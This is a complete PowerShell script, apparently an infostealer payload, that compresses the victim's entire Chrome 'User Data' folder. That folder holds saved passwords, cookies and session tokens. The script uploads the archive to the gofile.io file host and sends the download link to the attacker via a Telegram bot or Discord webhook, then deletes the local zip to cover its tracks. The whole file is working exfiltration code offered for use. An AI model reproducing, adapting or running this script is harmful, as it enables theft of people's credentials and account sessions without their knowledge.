### Created by mrproxy

# $botToken = "bot_token"
# $chatID = "chat_id"
# $webhook = "dc_webhook"

# Function for sending messages through Telegram Bot
function Send-TelegramMessage {
    param (
        [string]$message
    )

    if ($botToken -and $chatID) {
        $uri = "https://api.telegram.org/bot$botToken/sendMessage"
        $body = @{
            chat_id = $chatID
            text = $message
        }

        try {
            Invoke-RestMethod -Uri $uri -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
        } catch {
            Write-Host "Failed to send message to Telegram: $_"
        }
    } else {
        Send-DiscordMessage -message $message
    }
}

# Function for sending messages through Discord Webhook
function Send-DiscordMessage {
    param (
        [string]$message
    )

    $body = @{
        content = $message
    }

    try {
        Invoke-RestMethod -Uri $webhook -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
    } catch {
        Write-Host "Failed to send message to Discord: $_"
    }
}

function Upload-FileAndGetLink {
    param (
        [string]$filePath
    )

    # Get URL from GoFile
    $serverResponse = Invoke-RestMethod -Uri 'https://api.gofile.io/getServer'
    if ($serverResponse.status -ne "ok") {
        Write-Host "Failed to get server URL: $($serverResponse.status)"
        return $null
    }

    # Define the upload URI
    $uploadUri = "https://$($serverResponse.data.server).gofile.io/uploadFile"

    # Prepare the file for uploading
    $fileBytes = Get-Content $filePath -Raw -Encoding Byte
    $fileEnc = [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($fileBytes)
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    $bodyLines = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"$([System.IO.Path]::GetFileName($filePath))`"",
        "Content-Type: application/octet-stream",
        $LF,
        $fileEnc,
        "--$boundary--",
        $LF
    ) -join $LF

    # Upload the file
    try {
        $response = Invoke-RestMethod -Uri $uploadUri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
        if ($response.status -ne "ok") {
            Write-Host "Failed to upload file: $($response.status)"
            return $null
        }
        return $response.data.downloadPage
    } catch {
        Write-Host "Failed to upload file: $_"
        return $null
    }
}


# Check for 7zip path
$zipExePath = "C:\Program Files\7-Zip\7z.exe"
if (-not (Test-Path $zipExePath)) {
    $zipExePath = "C:\Program Files (x86)\7-Zip\7z.exe"
}

# Check for Chrome executable and user data
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
if (-not (Test-Path $chromePath)) {
    Send-TelegramMessage -message "Chrome User Data path not found!"
    exit
}

# Exit if 7zip path not found
if (-not (Test-Path $zipExePath)) {
    Send-TelegramMessage -message "7Zip path not found!"
    exit
}

# Create a zip of the Chrome User Data
$outputZip = "$env:TEMP\chrome_data.zip"
& $zipExePath a -r $outputZip $chromePath
if ($LASTEXITCODE -ne 0) {
    Send-TelegramMessage -message "Error creating zip file with 7-Zip"
    exit
}

# Upload the file and get the link
$link = Upload-FileAndGetLink -filePath $outputZip

# Check if the upload was successful and send the link via Telegram
if ($link -ne $null) {
    Send-TelegramMessage -message "Download link: $link"
} else {
    Send-TelegramMessage -message "Failed to upload file to gofile.io"
}

# Remove the zip file after uploading
Remove-Item $outputZip